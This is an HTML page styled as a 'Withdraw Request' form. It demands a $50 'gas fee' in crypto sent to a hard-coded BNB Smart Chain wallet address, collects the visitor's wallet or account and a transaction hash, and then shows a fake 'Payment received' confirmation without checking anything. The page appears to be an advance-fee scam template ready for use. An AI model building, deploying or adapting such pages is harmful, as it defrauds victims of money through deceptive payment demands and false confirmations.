<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdraw Request</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: radial-gradient(circle, #0a0a0a, #181818);
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(12px);
      border-radius: 12px;
      padding: 30px 25px;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 0 25px rgba(255, 204, 0, 0.2);
      text-align: center;
    }

    h2 {
      color: #facc15;
      margin-bottom: 20px;
    }

    .info-box {
      background-color: #1e293b;
      padding: 15px;
      border-radius: 10px;
      font-size: 0.95em;
      color: #e2e8f0;
      margin-bottom: 20px;
      line-height: 1.6;
    }

    .wallet-address {
      font-weight: bold;
      color: #facc15;
      font-size: 0.95em;
      word-break: break-all;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      background: #0f172a;
      color: #fff;
      font-size: 1em;
    }

    button {
      background-color: #22c55e;
      color: white;
      border: none;
      padding: 12px 0;
      border-radius: 8px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #16a34a;
    }

    .success-msg {
      display: none;
      margin-top: 20px;
      padding: 12px;
      background: #0d9488;
      border-radius: 8px;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Withdraw Request</h2>

    <div class="info-box">
      To process your withdrawal, a gas fee of <strong>$50</strong> is required.<br />
      Please send it via <strong>BNB Smart Chain (BEP-20)</strong> to:
      <div class="wallet-address">
        0xc903977a5d443c588cc52e893cdd9e5dc2df4d15
      </div>
    </div>

    <select id="withdrawMethod">
      <option value="">Select Withdraw Method</option>
      <option value="USDT (TRC20)">USDT (TRC20)</option>
      <option value="USDT (BEP20)">USDT (BEP20)</option>
      <option value="BTC">BTC</option>
      <option value="ETH">ETH</option>
      <option value="BNB">BNB</option>
      <option value="PayPal">PayPal</option>
      <option value="Payoneer">Payoneer</option>
      <option value="Easypaisa">Easypaisa</option>
      <option value="JazzCash">JazzCash</option>
    </select>

    <input type="text" id="walletAddress" placeholder="Your Wallet or Account" />

    <input type="text" id="txHash" placeholder="Transaction Hash (TXID)" />

    <button onclick="handlePayment()">I Paid</button>

    <div id="success" class="success-msg">
      âœ… Payment received! You will receive your withdrawal within 48 hours.
    </div>
  </div>

  <script>
    function handlePayment() {
      const method = document.getElementById('withdrawMethod').value;
      const address = document.getElementById('walletAddress').value.trim();
      const hash = document.getElementById('txHash').value.trim();

      if (!method || !address || !hash || hash.length < 10) {
        alert("Please fill in all fields correctly.");
        return;
      }

      // You can send this data to a backend or email here if needed

      document.getElementById('success').style.display = 'block';
    }
  </script>
</body>
</html>
